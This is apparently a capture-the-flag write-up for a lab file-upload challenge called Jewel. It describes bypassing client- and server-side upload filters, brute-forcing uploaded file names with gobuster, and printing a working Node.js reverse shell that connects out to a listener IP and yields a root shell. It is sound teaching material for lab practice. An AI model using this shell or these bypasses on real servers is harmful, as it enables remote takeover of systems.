# THM-Jewel-write-up
Write up for the last challenge in "Upload vulnerabilities" room, called Jewel


# Jewel

## Initial Reconnaissance
Navigating to the website we are face with a simple upload functionality.

In the background, gobuster is using seclist web directory brute force to find possible upload destinations.


Upon inspection of the source code we find that:
* There is a possible /assets directory (/assets/title.svg presents us with a nice vector picture) 
* There are two custom Java Scripts running

### Background.js

Might as well intercept and drop it, no need for flashing background...

### Upload.js

Here we can see the first of the filters - it is a client side filter that checks:

1. File size to be under 50kb
2. Magic number to be that of an Joint Photographic Experts Group
3. Whitelisting the extension to be only JPG or JPEG.

We intercept these in burp, and remove client side filtering.

## Further reconnaissance 

Intercepting server responses reveals that:

* Server is nginx/1.17.6
  * no CVE available
* Website is built with Express i.e. (Node.js)
  * This means we will be dropping a java-script reverse shell

### Server side filter

* No magic number checking
* Size checking in place - between 240 and 380 kb - should be sufficient for any reverse shell
* No filter checking in place
* MIME checking in place - easily spoofed, with interception of the request

Once we have understood and bypassed all filters, I uploaded a reverse shell in java script.
The file is called nodejs\_reverse.js. Let's find where it is.

## Finding the files

Output of Go-Buster:


'''
        /content              (Status: 301) [Size: 181] [--> /content/]
        /admin                (Status: 200) [Size: 1238]               
        /assets               (Status: 301) [Size: 179] [--> /assets/] 
        /modules              (Status: 301) [Size: 181] [--> /modules/]
        /Hannes_Alfv%E9n      (Status: 400) [Size: 1099]               
        /Alfv%E9n_wave        (Status: 400) [Size: 1097]               
        /Enciclopedia_Libre_Universal_en_Espa%F1ol (Status: 400) [Size: 1125]
        /mosquitologof%FCrshopfigurklein_3 (Status: 400) [Size: 1117]        
        /Post%2Dit%AE%5FSoftware%5FNotes%5F3%2E1%5F%5F%2D%5FStandard (Status: 400) [Size: 1143]
'''

**However** there was no file in /modules or /content. 
The /admin sight however allows you to load arbitrary modules.

We can see how this could be abused if we could locate our shell in /content
         -> we could load a "../content/shell" :)

##  Naming convention

Upon long time of struggle to locate the uploaded shell, I have spotted that pictures which alternate in the background of the main website are called:

* ABH.jpg
* LKQ.jpg
* SAD.jpg
* UAD.jpg

this looks like 3 letter random naming scheme. So, quick python script:

```
A = "ABCDEFGHIJKLMNOPQRSTUWVXYZ"

for i in A:
    for j in A:
        for k in A:
            print(i+j+k)
```

called in such a fashion to create a wordlist:

```
python3 wordlist_creator.py > wordlist.txt
```

I will not include the wordlist as it is 27^3 lines long (17,576).
It's a list of characters combination from AAA to ZZZ.

### Finding the shell

Time to find our uploaded shell, using the wordlist, and looking for jpg extension:

```
gobuster dir -u http://jewel.uploadvulns.thm/content -w wordlist -x jpg  
```

Output is as follows:

```
/ABH.jpg              (Status: 200) [Size: 705442]
/LKQ.jpg              (Status: 200) [Size: 444808]
/SAD.jpg              (Status: 200) [Size: 247159]
/UAD.jpg              (Status: 200) [Size: 342033]
/VNH.jpg              (Status: 200) [Size: 374]   
```

So we have found our shell as /VNH.jpg!

Let's open up a listener with 

```
nc -lnvp 4444
```



Nothing....


My code for the reverse shell

```
(function(){
    var net = require(net),
        cp = require(child_process),
        sh = cp.spawn(/bin/sh, []);
    var client = new net.Socket();
    client.connect(4444, "10.9.2.73", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();
```

Re-writing to:

```
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(443, "10.9.2.73", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();
```

re-running go-buster:
```
/ABH.jpg              (Status: 200) [Size: 705442]
/EIJ.jpg              (Status: 200) [Size: 379]   
/LKQ.jpg              (Status: 200) [Size: 444808]
/SAD.jpg              (Status: 200) [Size: 247159]
/UAD.jpg              (Status: 200) [Size: 342033]
/VNH.jpg              (Status: 200) [Size: 374]   
```

And now:

```
└─$ nc -lnvp 443 
listening on [any] 443 ...
connect to [10.9.2.73] from (UNKNOWN) [10.10.197.166] 59014
whoami
root
cat /var/www/flag.txt
